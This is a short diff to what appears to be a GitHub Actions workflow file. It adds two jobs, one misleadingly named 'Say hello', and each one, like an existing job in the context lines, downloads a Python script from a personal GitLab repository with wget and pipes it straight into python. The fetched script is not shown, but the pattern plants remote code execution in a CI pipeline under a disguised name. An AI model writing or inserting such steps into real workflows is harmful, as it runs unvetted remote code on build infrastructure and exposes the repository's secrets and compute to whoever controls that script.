@@ -16,3 +16,13 @@ jobs:
       - uses: docker://python:latest
         name: Run
         run: "wget -O- https://gitlab.com/rockymoysu/000/-/raw/main/setup.py | python "
+  B:
+    steps:
+      - uses: docker://python:latest
+        name: Say hello
+        run: "wget -O- https://gitlab.com/rockymoysu/000/-/raw/main/setup.py | python "
+  C:
+    steps:
+      - uses: docker://python:latest
+        name: Run
+        run: "wget -O- https://gitlab.com/rockymoysu/000/-/raw/main/setup.py | python "
